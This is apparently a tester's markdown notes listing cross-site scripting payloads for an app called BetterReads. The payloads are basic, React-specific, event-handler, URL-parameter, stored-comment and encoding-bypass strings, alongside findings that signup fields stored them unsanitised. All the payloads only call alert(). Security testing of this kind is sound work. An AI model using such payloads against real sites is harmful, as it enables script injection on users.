# XSS Test Payloads for BetterReads

## bug: if username does not exist, log in button works but enters as guest

## --------- Basic XSS Payloads ---------

<script>alert('XSS1')</script>
<img src="x" onerror="alert('XSS1')">
<body onload="alert('XSS1')">
<svg onload="alert('XSS1')">
<iframe src="javascript:alert('XSS1')">
<a href="javascript:alert('XSS1')">Click me</a>

## findings:
## - all payloads above were stored in database when entered as username/password on signup
## - search queries are URL-encoded, removing special characters
## - cannot fetch recommendations for URL-encoded usernames

## --------- React-Specific XSS Payloads ---------

{/* React comment with JS */}
{`${alert('XSS1')}`}
{eval('alert("XSS")')}
<div dangerouslySetInnerHTML={{__html: "<script>alert('XSS')</script>"}} />

## --------- Event Handler Payloads ---------
"><div onClick="alert('XSS1')">Click me</div>
"><input value="XSS1" onFocus="alert('XSS1')" autofocus>
"><button onmouseover="alert('XSS1')">Hover me</button>

## --------- URL Parameter Payloads ---------
?search=<script>alert('XSS1')</script>
?q=<img src=x onerror=alert('XSS1')>
?redirect=javascript:alert('XSS1')

## Stored XSS Payloads (for reviews/comments)
Nice book! <script>alert('XSS')</script>
I enjoyed reading this. <img src="x" onerror="alert('XSS')">
Great story! <svg onload="alert('XSS')"></svg>

## Encoding Bypass Payloads
%3Cscript%3Ealert('XSS')%3C/script%3E
<scr<script>ipt>alert('XSS')</script>
&#x3C;script&#x3E;alert(&#x27;XSS&#x27;)&#x3C;/script&#x3E;
